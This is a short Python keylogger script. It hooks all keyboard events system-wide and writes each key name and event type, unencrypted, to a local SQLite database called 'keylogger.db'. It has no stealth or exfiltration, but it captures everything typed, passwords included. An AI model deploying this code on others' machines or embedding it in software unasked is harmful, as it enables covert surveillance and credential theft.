import keyboard
import sqlite3

"""
{'event_type': 'up', 'scan_code': 57, 'time': 1736107166.0214162, 'device': None, 'is_keypad': False, 'modifiers': None, 'name': 'space'}
"""

with sqlite3.connect("keylogger.db") as conn:
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS events (
            name TEXT,
            event_type TEXT,
            is_repeat INTEGER NOT NULL,
            created DATETIME DEFAULT CURRENT_TIMESTAMP
        );
    """)

last_event = None

def register_keypress(event):
    global last_event

    with sqlite3.connect("keylogger.db") as conn:
        cursor = conn.cursor()

        is_repeat_event = event.name + event.event_type == last_event

        cursor.execute(
            'INSERT INTO events (name, event_type, is_repeat) VALUES (?, ?, ?)',
            (event.name, event.event_type, int(is_repeat_event))
        )

        last_event = event.name + event.event_type

keyboard.hook(register_keypress)
keyboard.wait()